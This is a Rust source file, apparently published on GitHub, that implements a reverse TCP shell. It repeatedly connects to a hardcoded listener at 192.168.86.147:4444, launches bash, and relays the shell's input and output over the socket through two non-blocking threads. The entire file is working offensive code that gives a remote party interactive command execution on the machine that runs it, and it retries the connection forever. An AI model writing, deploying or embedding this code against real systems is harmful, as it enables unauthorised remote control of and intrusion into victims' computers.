#![feature(libc)]

/// Opens a TCP connection to the configured server and runs a command.
/// In/output from the executed command is redirected from/to the established connection.
/// This is useful for creating a reverse_tcp shell.
///
/// Author: Gavyn Riebau
/// https://github.com/gavynriebau

extern crate env_logger;
#[macro_use]
extern crate log;
extern crate libc;

use std::net::*;
use std::process::*;
use std::io::*;
use std::thread;
use std::sync::Arc;
use std::time::Duration;
use std::sync::atomic::{AtomicBool, Ordering};
use std::os::unix::io::AsRawFd;

const LHOST : &str = "192.168.86.147";
const LPORT : &str = "4444";
const SHELL_TYPE : &str = "bash";
const RETRY_DELAY_MS : u64 = 2_000;
const SLEEP_DURATION_MS : u64 = 20;

fn handle_network_connection(stream: TcpStream) {
    debug!("Connected to {}", stream.peer_addr().unwrap());

    debug!("Changing stream to non-blocking");
    stream.set_nonblocking(true).unwrap();

    debug!("Cloned stream for use with channels.");
    let cloned_stream = stream.try_clone().expect("Failed to clone TCP stream");

    debug!("Connected to endpoint, starting shell");
    let shell_child = Command::new(SHELL_TYPE)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .expect("Failed to run command");

    debug!("Opening shell IO and creating sender / receiver channels");
    let mut shell_out = shell_child.stdout.expect("Failed to open command stdout");
    let mut shell_in = shell_child.stdin.expect("Failed to open command stdin");
    let mut network_in = stream;
    let mut network_out = cloned_stream;
    let finished = Arc::new(AtomicBool::new(false));
    let shell_reading_finished = Arc::clone(&finished);
    let network_reading_finished = Arc::clone(&finished);

    // Make shell stdin/stdout non-blocking.
    if cfg!(target_os = "linux") {
        unsafe {
            let fd_shell_out = shell_out.as_raw_fd();
            let flags_shell_out = libc::fcntl(fd_shell_out, libc::F_GETFL);
            let _ = libc::fcntl(fd_shell_out, libc::F_SETFL, flags_shell_out | libc::O_NONBLOCK);
            let fd_shell_in = shell_in.as_raw_fd();
            let flags_shell_in = libc::fcntl(fd_shell_in, libc::F_GETFL);
            let _ = libc::fcntl(fd_shell_in, libc::F_SETFL, flags_shell_in | libc::O_NONBLOCK);
        }
    }

    debug!("Beginning IO read/write loops");

    // Thread to read from shell and write to network
    thread::spawn(move || {
        let mut buffer: [u8; 512] = [0; 512];

        loop {

            if shell_reading_finished.load(Ordering::Relaxed) {
                debug!("Other thread finished, time to stop.");
                break;
            }

            match shell_out.read(&mut buffer) {
                Ok(read_count) => {
                    if read_count > 0 {
                        match network_in.write(&mut buffer[0..read_count]) {
                            Ok(write_count) => {
                                trace!("shell --> {:>3} --> socket", write_count);
                                network_in.flush().unwrap();
                            },
                            Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                                // Wait until network socket is ready.
                                thread::yield_now();
                            },
                            Err(e) => {
                                error!("Error reading from stream: {}", e);
                                shell_reading_finished.store(true, Ordering::Relaxed);
                            }
                        }
                    } else {
                        error!("Received no bytes from shell_out / must be closed.");
                        shell_reading_finished.store(true, Ordering::Relaxed);
                    }
                },
                Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                    // Wait until shell_out is ready.
                    thread::yield_now();
                },
                Err(e) => {
                    error!("Failed to read from bash because: {} - {:?}", e, e.kind());
                    shell_reading_finished.store(true, Ordering::Relaxed);
                }
            }

            thread::sleep(Duration::from_millis(SLEEP_DURATION_MS));
        }
    });

    // Thread to read from network and write to shell
    thread::spawn(move || {
        let mut buffer: [u8; 512] = [0; 512];

        loop {

            if network_reading_finished.load(Ordering::Relaxed) {
                debug!("Other thread finished, time to stop.");
                break;
            }

            match network_out.read(&mut buffer) {
                Ok(read_count) => {
                    if read_count > 0 {
                        match shell_in.write(&mut buffer[0..read_count]) {
                            Ok(write_count) => {
                                trace!("shell <-- {:>3} <-- socket", write_count);
                                shell_in.flush().unwrap();
                            },
                            Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                                // Wait until shell_in is ready.
                                thread::yield_now();
                            },
                            Err(e) => {
                                error!("Error writing to bash: {}", e);
                                network_reading_finished.store(true, Ordering::Relaxed);
                            }
                        }
                    } else {
                        error!("Received no bytes from network_out / must be closed.");
                        network_reading_finished.store(true, Ordering::Relaxed);
                    }
                },
                Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                    // Wait until network socket is ready.
                    thread::yield_now();
                },
                Err(e) => {
                    error!("Error reading from stream: {}", e);
                    network_reading_finished.store(true, Ordering::Relaxed);
                }
            }

            thread::sleep(Duration::from_millis(SLEEP_DURATION_MS));
        }
    });

    // Await completion of any thread.
    debug!("Waiting for threads to finish.");
    loop {
        if finished.load(Ordering::Relaxed) {
            debug!("Other thread finished, time to stop.");
            break;
        }

        thread::sleep(Duration::from_millis(SLEEP_DURATION_MS));
    }
}

fn main() {
    env_logger::init();

    loop {
        let remote_server = format!("{}:{}", LHOST, LPORT);
        debug!("Attempting to connect to '{}'", remote_server);

        match TcpStream::connect(remote_server) {
            Ok(stream) => handle_network_connection(stream),
            Err(_) => {
                warn!("Failed to connect, waiting before retry");
                std::thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
            }
        }
    }
}
